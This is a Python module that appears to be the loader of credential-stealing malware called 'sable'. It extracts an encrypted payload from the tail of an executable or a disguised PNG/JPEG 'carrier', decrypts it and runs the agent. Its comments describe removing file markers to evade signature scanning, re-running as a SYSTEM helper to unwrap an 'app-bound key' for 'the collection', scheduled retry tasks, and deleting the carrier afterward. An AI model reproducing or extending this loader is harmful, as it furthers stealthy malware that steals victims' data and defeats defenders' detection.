"""Archive loader: trailer, mutex, footer, decryption, mount.

This is the only module that decrypts, and the only one that runs before a config
exists. The two values it needs before anything else — the seal key and the mutex
name — come from the trailer, a fixed-width block welded between the sealed blob and
the footer. That is what makes a frozen launcher artifact-independent: the launcher
carries the reader, never the key, so one freeze opens every build.

Layout of the built artifact, last byte backwards:

    [ launcher ][ ballast ][ sealed blob ][ trailer 864 ][ footer 8 bytes ]

The footer is the little-endian offset of the sealed blob, so it is found with one seek
from EOF. The trailer is a fixed size, so its start is the same arithmetic. Neither is
found by scanning for a marker: position is the format. There used to be two magics
here, ``SBLT`` and ``SBLK``, and they located nothing — they only identified, which is a
worse trade than it looks, because one ``grep -a`` found every artifact this build had
ever produced. The ballast sits before the sealed blob rather than after the footer:
with the footer last, the offset needs no length field, and ballast appended after the
footer would push the footer out of position.

The decrypt half of the seal lives here rather than in ``core/seal.py`` because the
launcher cannot import a module that is inside the archive it has not decrypted yet.
``tests/test_contracts.py`` seals with ``core.seal`` and opens with this function, so
the two cannot drift apart silently.
"""

from __future__ import annotations

import importlib
import importlib.machinery
import importlib.util
import os
import shutil
import sys
import tempfile
import zipfile
from collections.abc import Sequence
from pathlib import Path
from types import ModuleType
from typing import Any, Final, NamedTuple

from . import log, util, winapi

# Pinned to core/forge.py by tests/test_contracts.py. Declared twice on purpose: this
# module ships inside the archive and cannot import the build side.
#
# There is no magic here and that is a decision. The footer is the last eight bytes and the
# trailer the 864 before it, both computed from the file's own size, so a marker located
# nothing — it only identified. What it identified was every artifact this build has ever
# produced, to a single `grep -a`, on a family that otherwise shares nothing but a
# bootloader. Position is the format; the marker was a signature.
FOOTER_SIZE: Final[int] = 8

# The helper's flag, duplicated from ``agent/abe.py`` for a hard reason: the mutex is
# acquired before the payload is unpacked, and ``abe`` lives inside the payload. The
# helper re-execs this same image, so without this the guard rejects it as a second
# instance and the unwrap never runs — the app-bound key is silently unavailable for
# the whole collection. Pinned to ``abe.UNWRAP_FLAG`` by tests/test_contracts.py.
HELPER_FLAG: Final[str] = "--abe-unwrap"

# A container that is not this executable. The carrier modes weld the same tail onto a PNG
# or a JPEG, and an image cannot be started, so the launcher is pointed at it: a launcher
# already on the machine opens a payload that arrived as a picture. Everything below the
# flag is the existing arithmetic with a different file — the footer is still the last
# eight bytes and the trailer still the 864 before it, because the image's own terminator
# is the last thing in the head and the weld starts where the head ends.
CARRIER_FLAG: Final[str] = "--carrier"

TRAILER_KEY_SLOT: Final[int] = 64
TRAILER_MUTEX_SLOT: Final[int] = 200 * 4
TRAILER_SIZE: Final[int] = TRAILER_KEY_SLOT + TRAILER_MUTEX_SLOT

SALT_SIZE: Final[int] = 16
NONCE_SIZE: Final[int] = 12
TAG_SIZE: Final[int] = 16
KDF_ITERATIONS: Final[int] = 200_000
MAX_SEALED_BYTES: Final[int] = 512 * 1024 * 1024

_STATE_ATTRIBUTE: Final[str] = "_sable_state"


class ArchiveError(RuntimeError):
    """The artifact is not shaped like an archive this loader can open."""


class Trailer(NamedTuple):
    """The two values read out of the block before the footer."""

    seal_key: str
    mutex: str


class Prepared(NamedTuple):
    archive: zipfile.ZipFile
    workspace: Path
    source: Path


def _state() -> dict[str, Any]:
    """Process-wide state shared across the launcher and payload copies of this module.

    ``sys`` is one object per process; the module globals are not, because the
    payload carries its own copy of every file. Both copies must agree that the
    mutex is held and that the archive has been prepared exactly once.
    """
    existing = getattr(sys, _STATE_ATTRIBUTE, None)
    if isinstance(existing, dict):
        return existing
    state: dict[str, Any] = {
        "held": False,
        "handle": None,
        "prepared": None,
        "carrier": None,
    }
    setattr(sys, _STATE_ATTRIBUTE, state)
    return state


def acquire(mutex: str | None = None, container: Path | None = None) -> bool:
    """Take the mutex guard. False when another instance already holds it.

    ``mutex`` is given by the ``.py`` artifact, which has no trailer to read. The
    launcher passes nothing and the name comes out of the trailer. A second call in
    the same process is a no-op that reports the first call's answer.

    ``container`` is the file the trailer is read out of. It defaults to this executable
    and is the carrier when the launcher was pointed at one: the name has to come from the
    file that actually holds it, and in carrier mode this executable carries nothing.
    """
    state = _state()
    if state["held"]:
        return True

    source = container if container is not None else util.executable_path()
    name = mutex if mutex is not None else _read_trailer(source).mutex
    handle, created = winapi.create_mutex(name)
    if not created:
        log.logger.debug("loader: mutex %s is already held", name)
        return False

    state["held"] = True
    state["handle"] = handle
    return True


def prepare(container: Path | None = None) -> Prepared:
    """Read the trailer and footer, decrypt to a temp file, replace it, open it.

    ``container`` is the file the tail is welded onto, and it defaults to this executable.
    Passing a carrier changes nothing below the first line: the footer is the last eight
    bytes of whatever file is named, so the same arithmetic addresses the same block.
    """
    state = _state()
    cached = state["prepared"]
    if cached is not None:
        return cached

    executable = container if container is not None else util.executable_path()
    if container is not None:
        # Recorded here as well as in ``boot`` so a caller that prepares directly — the
        # script artifact's own bootstrap, a test — gets the same teardown behaviour.
        state["carrier"] = container
    seal_key = _read_trailer(executable).seal_key
    offset = _archive_offset(executable)
    sealed = _read_sealed(executable, offset)
    plaintext = _open_sealed(sealed, seal_key)

    workspace = Path(tempfile.mkdtemp(prefix="sable-"))
    target = workspace / "payload.zip"
    staging = workspace / "payload.zip.part"
    staging.write_bytes(plaintext)
    # Never decrypt in place over the source, and never hand a half-written file to
    # zipfile: the replace is atomic within the same directory.
    os.replace(staging, target)

    archive = zipfile.ZipFile(target)
    prepared = Prepared(archive=archive, workspace=workspace, source=target)
    state["prepared"] = prepared
    log.logger.debug("loader: archive opened, %d bytes", len(plaintext))
    return prepared


def adopt(archive: zipfile.ZipFile, workspace: Path, source: Path) -> None:
    """Register an already-decrypted archive as the prepared one.

    The generated ``.py`` artifact decrypts its own payload and hands it here, so
    the rest of the boot path — config, gate, collection — runs exactly as it does
    behind a frozen launcher. ``prepare`` returns this instead of seeking a trailer
    that a text file does not have. Replacing a previous entry closes it first.
    """
    state = _state()
    previous = state["prepared"]
    if previous is not None:
        try:
            previous.archive.close()
        except OSError:
            log.logger.debug("loader: previous archive close failed", exc_info=True)
    state["prepared"] = Prepared(archive=archive, workspace=workspace, source=source)


def cleanup() -> None:
    """Close the archive, remove the workspace, and let go of the carrier.

    Safe to call twice. The carrier is deleted only when there is nothing left to deliver:
    a parked archive brings this same image back on a task, and that run needs the file it
    was pointed at. Deleting it on every exit would leave a retry pointing at nothing, and
    keeping it is the one thing that makes the mode worth having past the first run.
    """
    state = _state()
    carrier = state["carrier"]
    state["carrier"] = None
    if carrier is not None and not util.pending_queue():
        try:
            carrier.unlink(missing_ok=True)
            log.logger.debug("loader: carrier removed")
        except OSError:
            log.logger.debug("loader: carrier could not be removed", exc_info=True)

    prepared = state["prepared"]
    if prepared is None:
        return
    state["prepared"] = None
    try:
        prepared.archive.close()
    except OSError:
        log.logger.debug("loader: archive close failed", exc_info=True)
    shutil.rmtree(prepared.workspace, ignore_errors=True)


def carrier_from(argv: Sequence[str]) -> Path | None:
    """The ``--carrier`` path, or None when this run is its own container.

    Both spellings are accepted — ``--carrier X`` and ``--carrier=X`` — because the flag is
    assembled by three callers (an operator, the retry task, the SYSTEM helper) and only
    one of them is under this repository's control.
    """
    for index, item in enumerate(argv):
        if item == CARRIER_FLAG:
            return Path(argv[index + 1]) if index + 1 < len(argv) else None
        if item.startswith(CARRIER_FLAG + "="):
            value = item.split("=", 1)[1]
            return Path(value) if value else None
    return None


def carrier_args() -> list[str]:
    """The argv fragment a re-exec needs to find the same container. Empty for exe output.

    The retry task and the SYSTEM helper both re-run this image from a fresh command line,
    and neither inherits argv. Without this the second run looks for a tail on an
    executable that has none and fails on a trailer it cannot read.
    """
    carrier = _state()["carrier"]
    return [CARRIER_FLAG, str(carrier)] if carrier is not None else []


def _guarded(argv: Sequence[str], container: Path | None = None) -> bool:
    """Whether this run may continue, i.e. nobody else is holding the mutex.

    The helper is exempt. It is a short-lived worker the running agent started, and the
    running agent is the one holding the mutex, so guarding the helper means it exits
    before its flag is ever read and the app-bound key is silently unavailable for the
    whole collection.
    """
    if HELPER_FLAG in argv:
        return True
    return acquire(container=container)


def boot() -> int:
    """Launcher entry: guard, prepare, load the payload entry, run it, clean up.

    Arguments are forwarded. The agent reads three of them and nothing else: the
    ``--retry`` that the delivery queue's scheduled task passes, the ``--abe-unwrap``
    the SYSTEM helper passes when it re-runs this same image, and ``--debug``. Dropping
    them here made both re-execs start a fresh collection instead of the job they were
    launched for.
    """
    try:
        # The container is resolved before the guard because the mutex name lives in the
        # trailer, and in carrier mode this executable holds no trailer to read it from.
        container = carrier_from(sys.argv)
        _state()["carrier"] = container
        allowed = _guarded(sys.argv, container)
    except Exception:
        # The mutex name lives in the trailer, so a launcher welded to nothing has no
        # name to guard with. This call sits ahead of the first try block on purpose -
        # the guard has to run before anything is decrypted - and a windowed build
        # turns an escaping exception into a modal traceback nobody can close from a
        # script. Refuse quietly with a non-zero code instead.
        log.logger.exception("loader: guard failed")
        return 1

    if not allowed:
        return 0

    try:
        prepared = prepare(container)
    except Exception:
        log.logger.exception("loader: archive preparation failed")
        return 1

    try:
        module = _load_entry(prepared.source)
        return int(module.main(sys.argv[1:]))
    except ArchiveError:
        log.logger.exception("loader: payload is not loadable")
        return 1
    except Exception:
        log.logger.exception("loader: payload raised")
        return 1
    finally:
        cleanup()


def _slot_text(field: bytes, name: str) -> str:
    """One NUL-terminated slot. Everything after the first NUL is padding."""
    text = field.split(b"\x00", 1)[0]
    if not text:
        raise ArchiveError(f"trailer {name} is empty")
    try:
        return text.decode("utf-8")
    except UnicodeDecodeError as exc:
        raise ArchiveError(f"trailer {name} is not UTF-8") from exc


def _read_trailer(executable: Path) -> Trailer:
    try:
        size = executable.stat().st_size
    except OSError as exc:
        raise ArchiveError(f"{executable.name}: cannot stat") from exc

    minimum = TRAILER_SIZE + FOOTER_SIZE + 1
    if size < minimum:
        raise ArchiveError(f"{executable.name}: {size} bytes cannot carry a trailer")

    with executable.open("rb") as handle:
        handle.seek(size - FOOTER_SIZE - TRAILER_SIZE)
        block = handle.read(TRAILER_SIZE)

    if len(block) != TRAILER_SIZE:
        raise ArchiveError(f"{executable.name}: trailer is short by {TRAILER_SIZE - len(block)}")

    # No marker to check, so the slots have to carry their own proof: both are non-empty
    # UTF-8, and `_slot_text` refuses anything else. A file with neither a key nor a mutex
    # is not one of these artifacts whatever its length.
    return Trailer(
        seal_key=_slot_text(block[:TRAILER_KEY_SLOT], "seal key"),
        mutex=_slot_text(block[TRAILER_KEY_SLOT:TRAILER_KEY_SLOT + TRAILER_MUTEX_SLOT], "mutex"),
    )


def _archive_offset(executable: Path) -> int:
    try:
        size = executable.stat().st_size
    except OSError as exc:
        raise ArchiveError(f"{executable.name}: cannot stat") from exc

    tail = FOOTER_SIZE + TRAILER_SIZE
    if size <= tail + 1:
        raise ArchiveError(f"{executable.name}: {size} bytes cannot carry a footer")

    with executable.open("rb") as handle:
        handle.seek(size - FOOTER_SIZE)
        footer = handle.read(FOOTER_SIZE)

    if len(footer) != FOOTER_SIZE:
        raise ArchiveError(f"{executable.name}: footer is short by {FOOTER_SIZE - len(footer)}")

    offset = int.from_bytes(footer, "little")
    if offset <= 0 or offset >= size - tail:
        raise ArchiveError(f"{executable.name}: footer offset {offset} is outside the file")
    return offset


def _read_sealed(executable: Path, offset: int) -> bytes:
    end = executable.stat().st_size - FOOTER_SIZE - TRAILER_SIZE
    length = end - offset
    if length <= 0 or length > MAX_SEALED_BYTES:
        raise ArchiveError(f"sealed blob is {length} bytes")

    with executable.open("rb") as handle:
        handle.seek(offset)
        blob = handle.read(length)

    if len(blob) != length:
        raise ArchiveError(f"sealed blob is {len(blob)} of {length} bytes")
    return blob


def _open_sealed(blob: bytes, key_text: str) -> bytes:
    # Imported here so the module stays importable on a machine without pycryptodome,
    # which is what the Linux import test needs.
    from Crypto.Cipher import AES
    from Crypto.Hash import SHA256
    from Crypto.Protocol.KDF import PBKDF2

    minimum = SALT_SIZE + NONCE_SIZE + TAG_SIZE + 1
    if len(blob) < minimum:
        raise ArchiveError(f"sealed blob is {len(blob)} bytes, needs {minimum}")

    salt = blob[:SALT_SIZE]
    nonce = blob[SALT_SIZE:SALT_SIZE + NONCE_SIZE]
    tag = blob[-TAG_SIZE:]
    ciphertext = blob[SALT_SIZE + NONCE_SIZE:-TAG_SIZE]

    key = PBKDF2(
        key_text.encode("utf-8"),
        salt,
        dkLen=32,
        count=KDF_ITERATIONS,
        hmac_hash_module=SHA256,
    )
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    try:
        return cipher.decrypt_and_verify(ciphertext, tag)
    except ValueError as exc:
        raise ArchiveError("seal key rejected the archive") from exc


def _load_entry(archive_path: Path) -> ModuleType:
    """Exec ``agent.entry`` out of the archive, ahead of any copy on disk."""
    package_spec = importlib.machinery.PathFinder.find_spec("agent", [str(archive_path)])
    if package_spec is None or package_spec.loader is None:
        raise ArchiveError("archive carries no agent package")

    package = importlib.util.module_from_spec(package_spec)
    sys.modules["agent"] = package
    package_spec.loader.exec_module(package)

    for name in [key for key in sys.modules if key.startswith("agent.")]:
        del sys.modules[name]

    return importlib.import_module("agent.entry")


__all__ = [
    "CARRIER_FLAG",
    "FOOTER_SIZE",
    "TRAILER_KEY_SLOT",
    "TRAILER_MUTEX_SLOT",
    "TRAILER_SIZE",
    "ArchiveError",
    "Prepared",
    "Trailer",
    "acquire",
    "adopt",
    "boot",
    "carrier_args",
    "carrier_from",
    "cleanup",
    "prepare",
]
